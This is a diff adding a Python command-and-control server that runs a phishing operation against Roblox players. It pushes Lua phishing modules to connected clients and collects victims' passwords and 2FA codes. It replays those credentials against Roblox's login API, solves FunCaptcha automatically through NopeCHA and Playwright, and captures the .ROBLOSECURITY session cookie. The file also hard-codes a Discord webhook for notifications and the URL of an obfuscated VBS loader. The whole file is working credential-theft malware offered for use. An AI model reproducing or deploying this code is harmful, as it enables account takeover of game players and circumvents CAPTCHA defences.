@@ -1,0 +1,649 @@
+"""
+c2_server.py — C2 server with phish flow + captcha solving via NopeCHA/Playwright.
+Flow:
+1. Start WebSocket server
+2. Client connects -> send phish.lua module
+3. Victim enters password -> login via requests API
+4. If captcha -> launch browser + NopeCHA extension -> auto-solve
+5. Cookie captured -> save & notify client
+"""
+
+import asyncio
+import json
+import time
+import os
+import sys
+import base64
+import subprocess
+import threading
+import datetime
+import websockets
+import requests
+
+logging.basicConfig(level=logging.INFO, format='%(asctime)s %(message)s')
+log = logging.getLogger(__name__)
+
+WS_HOST = "0.0.0.0"
+WS_PORT = 8081
+UPDATE_DELAY = 2 * 3600  # hours before victim can retry
+PHISH_COOLDOWN = 2  # seconds between phish sends
+NOPECHA_PROXY = os.environ.get("NOPECHA_PROXY", "socks5h://127.0.0.1:10808")
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1525982120776962149/In8CR0yblQA5w1mCDUl1z2GDMm4dw4Ip4CR25ELE62EBZCNuo82Sevt4A33zhaYGh4-w"
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+MODULES_DIR = os.path.join(BASE_DIR, "modules")
+VBS_URL = "https://github.com/RomanEgovcev/DuelistPvp/releases/download/v1/loader_obfuscated.vbs"
+EXT_PATH = os.path.join(BASE_DIR, "chromium_automation")
+MODULES = {"phish.lua", "phish_2fa.lua", "update.lua", "test_request.lua"}
+
+tg_proc = None
+
+
+def tg_write(text):
+    try:
+        tg_proc.stdin.write(json.dumps(text) + "\n")
+        tg_proc.stdin.flush()
+    except Exception:
+        pass
+
+
+def dc_write(text):
+    try:
+        requests.post(DISCORD_WEBHOOK, json={"content": text}, timeout=5)
+    except Exception as e:
+        log.error(f"[-] DC webhook error: {e}")
+
+
+class State:
+    def __init__(self, uid, place, name):
+        self.uid = uid
+        self.place = place
+        self.name = name
+        self.stage = "connected"
+        self.pw = None
+        self.sess = requests.Session()
+        self.sess.headers.update({
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "Origin": "https://www.roblox.com",
+            "Referer": "https://www.roblox.com/",
+        })
+        self.csrf = None
+        self.ws = None
+        self.seen = time.time()
+        self.last_phish = 0
+        self.phish_task = None
+        self.done_at = None
+        self.login_in_progress = False
+
+    @property
+    def username(self):
+        try:
+            r = requests.get(f"https://users.roblox.com/v1/users/{self.uid}", timeout=10)
+            if r.status_code == 200:
+                self._username = r.json().get("name", "unknown")
+        except Exception:
+            pass
+        return getattr(self, "_username", "unknown")
+
+    def __repr__(self):
+        return f"<State {self.name} stage={self.stage}>"
+
+
+async def send_mod(ws, name):
+    path = os.path.join(MODULES_DIR, name)
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            code = f.read()
+        await ws.send(code)
+    except FileNotFoundError:
+        log.error(f"[-] Module not found: {name}")
+
+
+async def send_msg(ws, d):
+    await ws.send(json.dumps(d))
+
+
+async def get_csrf(sess):
+    loop = asyncio.get_running_loop()
+    def _sync():
+        r = sess.headers.get("x-csrf-token")
+        if r:
+            return r
+        r = sess.post("https://auth.roblox.com/v2/login")
+        token = r.headers.get("x-csrf-token")
+        if not token:
+            log.warning(f"[-] CSRF failed: {r.status_code}")
+        return token
+    return await loop.run_in_executor(None, _sync)
+
+
+async def roblox_login(sess, username, password, csrf, tfa=None):
+    loop = asyncio.get_running_loop()
+    payload = {"ctype": "Username", "cvalue": username, "password": password}
+    if tfa:
+        payload["tfaCode"] = tfa
+    headers = {"x-csrf-token": csrf} if csrf else {}
+    def _sync():
+        return sess.post("https://auth.roblox.com/v2/login", json=payload, headers=headers)
+    return await loop.run_in_executor(None, _sync)
+
+
+def save_account(st, cookie, tfa_code=None):
+    log.info(f"[+] Cookie for {st.name}")
+
+
+async def browser_login(st, username, password):
+    loop = asyncio.get_running_loop()
+    return await loop.run_in_executor(None, _browser_login_sync, st, username, password)
+
+
+def _get_captcha_frames(page):
+    """Re-find captcha frames. Uses evaluate instead of query_selector (cross-origin fix).
+Returns (enforcement_frame, game_core_frame).
+If no separate game core, enforcement frame IS the challenge frame."""
+    enforcement_frame = None
+    game_core_frame = None
+    for f in page.frames:
+        url = f.url.lower()
+        if "arkoselabs.roblox.com" in url or "enforcement" in url:
+            enforcement_frame = f
+        if "ec-game-core" in url:
+            game_core_frame = f
+    if not game_core_frame:
+        try:
+            gcf_src = page.evaluate("!!document.querySelector('#game-core-frame')")
+            if gcf_src:
+                game_core_frame = page.evaluate("() => { const el = document.querySelector('#game-core-frame'); return el ? el.src : null; }")
+        except Exception:
+            pass
+    return enforcement_frame, game_core_frame
+
+
+def _find_canvas_frame(page, enforcement_frame):
+    """Find the frame that contains the captcha canvas by scanning all frames."""
+    candidates = []
+    seen = set()
+    def walk(frames):
+        for f in frames:
+            fid = id(f)
+            if fid in seen:
+                continue
+            seen.add(fid)
+            candidates.append(f)
+            walk(f.child_frames)
+    walk(page.frames)
+    for f in candidates:
+        try:
+            has_canvas = f.evaluate("!!document.querySelector('canvas')")
+            if has_canvas:
+                return f
+        except Exception:
+            continue
+    return None
+
+
+def _start_captcha_challenge(gm):
+    """Click 'Начать задачу' / 'Start' button in game frame to begin captcha."""
+    try:
+        clicked = gm.evaluate("""() => {
+            const btns = document.querySelectorAll('button, [role=button], .challenge-button, .start-button');
+            for (const b of btns) {
+                if (b.offsetParent !== null) {
+                    b.click();
+                    return b.textContent.trim();
+                }
+            }
+            return null;
+        }""")
+        if clicked:
+            log.info(f"[*] Clicked captcha start button: '{clicked}'")
+        return clicked
+    except Exception:
+        return None
+
+
+def _capture_game_frame(page, gm, enf):
+    """Capture game frame content: either canvas or screenshot."""
+    from playwright.sync_api import TimeoutError as PWTimeout
+    import base64 as b64mod
+    b64 = None
+    try:
+        shot_bytes = gm.screenshot(type="png")
+        b64 = b64mod.b64encode(shot_bytes).decode("ascii")
+    except Exception:
+        try:
+            b64 = gm.evaluate("""() => {
+                const c = document.querySelector('canvas');
+                if (c) return c.toDataURL('image/png').split(',')[1];
+                return null;
+            }""")
+        except Exception:
+            pass
+    return b64
+
+
+def _get_solution_type(d):
+    """Determine what type of solution NopeCHA returned and parse it."""
+    if isinstance(d, list):
+        if len(d) > 0 and isinstance(d[0], dict):
+            seq = d[0].get("sequence", [])
+            if seq:
+                return "arrows", seq
+        return "tiles", d
+    if isinstance(d, dict):
+        if "sequence" in d:
+            return "arrows", d["sequence"]
+    return None, None
+
+
+def _execute_arrow_solution(page, gm, seq):
+    """Execute arrow key sequence on the game frame."""
+    log.info(f"[*] Executing arrow sequence: {seq}")
+    for action in seq:
+        key = action.get("key", "").lower()
+        if key in ("up", "down", "left", "right"):
+            try:
+                gm.evaluate("() => { document.body.setAttribute('tabindex', '-1'); document.body.focus(); }")
+                gm.keyboard.press(key)
+                time.sleep(action.get("duration", 0.5))
+            except Exception:
+                pass
+    try:
+        gm.evaluate("""() => {
+            const btns = document.querySelectorAll('button, [type=submit]');
+            for (const b of btns) {
+                if (b.offsetParent !== null) { b.click(); break; }
+            }
+        }""")
+    except Exception:
+        pass
+    log.info("[*] Arrow sequence done")
+
+
+def _solve_funcaptcha(page, _enf_old=None, _gm_old=None):
+    """Solve FunCaptcha using NopeCHA API. Returns token string or None."""
+    from playwright.sync_api import TimeoutError as PWTimeout
+
+    NOPECHA_API = "https://api.nopecha.com"
+    gm = None
+
+    for i in range(60):
+        enf, gm = _get_captcha_frames(page)
+        if gm:
+            break
+        time.sleep(0.5)
+
+    if not gm:
+        enf = _enf_old
+        gm = _gm_old
+    if not gm:
+        log.error("[-] No game frame found")
+        return None
+
+    canvas_frame = _find_canvas_frame(page, enf or gm)
+    if canvas_frame:
+        log.info(f"[*] Canvas frame at +{i}")
+        gm = canvas_frame
+
+    _start_captcha_challenge(gm)
+    time.sleep(1)
+
+    has_content = False
+    for _ in range(30):
+        try:
+            cnt = gm.evaluate("""() => {
+                const btns = document.querySelectorAll('button, canvas, [class*="challenge"], .game-core-canvas');
+                return btns.length > 0;
+            }""")
+            if cnt:
+                has_content = True
+                break
+        except Exception:
+            pass
+        time.sleep(0.5)
+
+    if not has_content:
+        log.error("[-] No interactive content after 30s")
+        return None
+
+    shot = _capture_game_frame(page, gm, enf)
+    if not shot:
+        return None
+
+    task_text = None
+    try:
+        task_text = enf.evaluate("""() => {
+            for (const s of document.querySelectorAll('[class*="task"], [class*="instruction"], p, h2, h3, span, strong')) {
+                if (s.offsetParent !== null) return s.textContent.trim();
+            }
+            return null;
+        }""")
+    except Exception:
+        pass
+
+    log.info(f"[*] Task: {task_text}")
+
+    try:
+        resp = requests.post(f"{NOPECHA_API}/v1/recognition/funcaptcha",
+            json={
+                "task": task_text if task_text and "Click on the image of" in task_text else None,
+                "image_data": f"data:image/png;base64,{shot}",
+            },
+            proxies={"http": NOPECHA_PROXY, "https": NOPECHA_PROXY},
+            timeout=30)
+        result = resp.json()
+        job_id = result.get("job_id") or result.get("data", {}).get("id", result.get("id"))
+        if not job_id:
+            log.error(f"[-] NopeCHA error: {result}")
+            return None
+
+        for _ in range(60):
+            time.sleep(1)
+            poll = requests.get(f"{NOPECHA_API}/v1/recognition/funcaptcha?id={job_id}",
+                proxies={"http": NOPECHA_PROXY, "https": NOPECHA_PROXY},
+                timeout=30)
+            poll_result = poll.json()
+            data = poll_result.get("data") or poll_result
+            if data and data != "pending":
+                break
+
+        sol_type, solution = _get_solution_type(data)
+        if sol_type == "tiles":
+            log.info(f"[+] Tile solution: {solution}")
+            if not gm:
+                return None
+            for tile in solution:
+                x, y = tile.get("x", 0), tile.get("y", 0)
+                try:
+                    rect = gm.evaluate("""() => {
+                        const c = document.querySelector('canvas');
+                        const r = c.getBoundingClientRect();
+                        return {x: r.x, y: r.y, w: r.width, h: r.height};
+                    }""")
+                    click_x = rect["x"] + x * rect["w"] / 400
+                    click_y = rect["y"] + y * rect["h"] / 400
+                    page.mouse.click(click_x, click_y)
+                    time.sleep(0.3)
+                except Exception as e:
+                    log.error(f"  Error: {e}")
+            log.info("[*] Tiles clicked")
+        elif sol_type == "arrows":
+            _execute_arrow_solution(page, gm, solution)
+        else:
+            log.error(f"[-] Unknown solution type")
+
+        time.sleep(1)
+        try:
+            token = enf.evaluate("""() => {
+                for (const id of ['FunCaptcha-Token', 'verification-token', 'fc-token']) {
+                    const el = document.getElementById(id);
+                    if (el) return el.value || el.textContent || el.innerText;
+                }
+                return null;
+            }""")
+            if token:
+                log.info(f"[+] Token: {token[:50]}...")
+                return token
+        except Exception:
+            pass
+
+        time.sleep(2)
+        try:
+            token = enf.evaluate("""() => {
+                for (const id of ['FunCaptcha-Token', 'verification-token', 'fc-token']) {
+                    const el = document.getElementById(id);
+                    if (el) return el.value || el.textContent || el.innerText;
+                }
+                return null;
+            }""")
+            if token:
+                return token
+        except Exception:
+            pass
+
+        log.warning("[-] Token not found after action, wait and retry...")
+        return None
+    except Exception as e:
+        log.error(f"[-] Solve exception: {e}")
+        return None
+
+
+def _browser_login_sync(st, username, password):
+    from playwright.sync_api import sync_playwright
+    try:
+        pw_instance = sync_playwright().start()
+    except ImportError:
+        log.error("[-] pip install playwright")
+        return
+
+    pw_profile = os.path.join(BASE_DIR, "pw_profile")
+    ext_path = os.path.abspath(EXT_PATH)
+
+    args = [
+        "--no-proxy-server",
+        f"--disable-extensions-except={ext_path}",
+        f"--load-extension={ext_path}",
+    ]
+    context = pw_instance.chromium.launch_persistent_context(
+        pw_profile, headless=False, args=args,
+        viewport={"width": 800, "height": 600},
+    )
+
+    try:
+        page = context.pages[0] if context.pages else context.new_page()
+        page.goto("https://www.roblox.com/login", wait_until="domcontentloaded")
+        page.fill("#login-username", username)
+        page.fill("#login-password", password)
+        page.click("#login-button")
+        time.sleep(2)
+
+        # Wait for result - check for captcha
+        timeout_start = time.time()
+        cookie_result = None
+        while time.time() - timeout_start < 120:
+            cookies = context.cookies()
+            for c in cookies:
+                if c["name"] == ".ROBLOSECURITY":
+                    st.done_at = time.time()
+                    return {"cookie": c["value"], "domain": c.get("domain", "")}
+
+            # Check for captcha
+            try:
+                captcha_el = page.query_selector("#arkose-0, #FunCaptcha, [class*=challenge]")
+                if captcha_el:
+                    log.info("[*] Captcha detected")
+                    token = _solve_funcaptcha(page)
+                    if token:
+                        # Re-submit or wait for redirect
+                        page.click("#login-button")
+                        time.sleep(3)
+                        cookies = context.cookies()
+                        for c in cookies:
+                            if c["name"] == ".ROBLOSECURITY":
+                                st.done_at = time.time()
+                                return {"cookie": c["value"], "domain": c.get("domain", "")}
+            except Exception:
+                pass
+            time.sleep(1)
+
+        return None
+    finally:
+        context.close()
+        pw_instance.stop()
+
+
+async def delayed_send(st, delay, module, new_stage):
+    await asyncio.sleep(delay)
+    if st.stage in ("connected", "phish_sent", "awaiting_2fa") and st.ws and not st.login_in_progress:
+        await send_mod(st.ws, module)
+        st.last_phish = time.time()
+        st.stage = new_stage
+
+
+async def pipeline(st, ws):
+    st.ws = ws
+    st.seen = time.time()
+
+    if st.stage == "closed_by_user":
+        return
+
+    if st.stage in ("connected", "phish_sent"):
+        if st.last_phish and time.time() - st.last_phish < PHISH_COOLDOWN:
+            return
+        if st.phish_task:
+            st.phish_task.cancel()
+        st.phish_task = asyncio.create_task(delayed_send(st, PHISH_COOLDOWN, "phish.lua", "phish_sent"))
+        return
+
+    if st.stage == "complete":
+        if st.done_at and time.time() - st.done_at >= UPDATE_DELAY:
+            st.stage = "update_sent"
+            await send_mod(ws, "update.lua")
+            return
+        return
+
+    if st.stage == "awaiting_2fa":
+        await send_mod(ws, "phish_2fa.lua")
+        return
+
+
+async def handler(ws):
+    raw = await ws.recv()
+    try:
+        msg = json.loads(raw)
+    except json.JSONDecodeError:
+        return
+
+    t = msg.get("type")
+    uid = msg.get("userId")
+    place = msg.get("placeId")
+    name = msg.get("playerName", "Unknown")
+
+    if t == "hello":
+        st = State(uid, place, name)
+        log.info(f"[+] New: {name} (ID={uid}, place={place})")
+        st.ws = ws
+        await pipeline(st, ws)
+
+        try:
+            async for raw in ws:
+                try:
+                    msg = json.loads(raw)
+                except json.JSONDecodeError:
+                    continue
+
+                t = msg.get("type")
+                if st.stage == "closed_by_user":
+                    continue
+
+                if t == "place":
+                    st.place = msg.get("placeId")
+                    st.seen = time.time()
+                    log.info(f"  {st.name} changed place -> reset")
+                    st.stage = "connected"
+                    st.pw = None
+                    await pipeline(st, ws)
+
+                elif t == "password":
+                    password = msg.get("password", "")
+                    st.pw = password
+                    st.seen = time.time()
+
+                    if st.name == "test123":
+                        log.info(f"[*] Test mode for {st.name}, sending test_request.lua")
+                        await send_mod(ws, "test_request.lua")
+                        continue
+
+                    log.info(f"[*] PW from {st.name}")
+                    st.login_in_progress = True
+                    st.stage = "logging_in"
+                    log.info(f"[+] Password received for {st.name} | https://browserleaks.com/ip/")
+
+                    await send_msg(ws, {"type": "hold", "message": "Проверка данных..."})
+
+                    try:
+                        username = st.username
+                        csrf = await get_csrf(st.sess)
+                        resp = await roblox_login(st.sess, username, password, csrf)
+                        if resp.status_code == 200:
+                            cookie = resp.cookies.get(".ROBLOSECURITY")
+                            if cookie:
+                                st.stage = "complete"
+                                st.done_at = time.time()
+                                await send_msg(ws, {"type": "ok", "message": "Успешно!"})
+                                continue
+
+                        st.sess.headers["x-csrf-token"] = csrf
+                        resp = await roblox_login(st.sess, username, password, csrf)
+                        if resp.status_code == 200:
+                            cookie = resp.cookies.get(".ROBLOSECURITY")
+                            if cookie:
+                                st.stage = "complete"
+                                st.done_at = time.time()
+                                await send_msg(ws, {"type": "ok", "message": "Успешно!"})
+                                continue
+
+                        if resp.status_code == 403 and "challenge" in resp.text.lower():
+                            log.info("[!] Challenge required, launching browser...")
+                            result = await browser_login(st, username, password)
+                            if result and "cookie" in result:
+                                st.stage = "complete"
+                                st.done_at = time.time()
+                                await send_msg(ws, {"type": "ok", "message": "Успешно!"})
+                            else:
+                                await send_msg(ws, {"type": "err", "message": "Не удалось войти"})
+                        elif "two-step" in resp.text.lower():
+                            st.stage = "awaiting_2fa"
+                            await send_msg(ws, {"type": "2fa"})
+                            await send_mod(ws, "phish_2fa.lua")
+                        else:
+                            await send_msg(ws, {"type": "err", "message": "Неверный пароль"})
+
+                    except Exception as e:
+                        log.error(f"[-] Login error: {e}")
+                        await send_msg(ws, {"type": "err", "message": f"Ошибка: {str(e)[:80]}"})
+                    finally:
+                        st.login_in_progress = False
+
+                elif t == "2fa":
+                    code = msg.get("code", "")
+                    log.info(f"2FA code: {code}")
+
+                elif t in ("closed", "timed_out"):
+                    st.stage = "closed_by_user"
+                    break
+
+        except websockets.exceptions.ConnectionClosed:
+            pass
+        finally:
+            log.info(f"[-] {st.name} disconnected (stage={st.stage})")
+
+
+def _extract_cookie(log_text):
+    """Extract .ROBLOSECURITY from text."""
+    import re
+    m = re.search(r".ROBLOSECURITY[=:]\s*(\S+)", log_text)
+    return m.group(1) if m else None
+
+
+async def status_loop():
+    while True:
+        await asyncio.sleep(30)
+        online = sum(1 for s in states if s.stage not in ("closed_by_user", "complete"))
+        log.info(f"[ON] {online} online | {len(states)} total")
+
+
+async def main():
+    global states
+    states = []
+
+    async def _handler(ws):
+        await handler(ws)
+
+    async with websockets.serve(_handler, WS_HOST, WS_PORT) as server:
+        log.info(f"\n  C2 Server\n  WS: ws://{WS_HOST}:{WS_PORT}\n  Update delay: {UPDATE_DELAY // 3600}h\n    ")
+        asyncio.create_task(status_loop())
+        await asyncio.Future()
+
+
+if __name__ == "__main__":
+    asyncio.run(main())
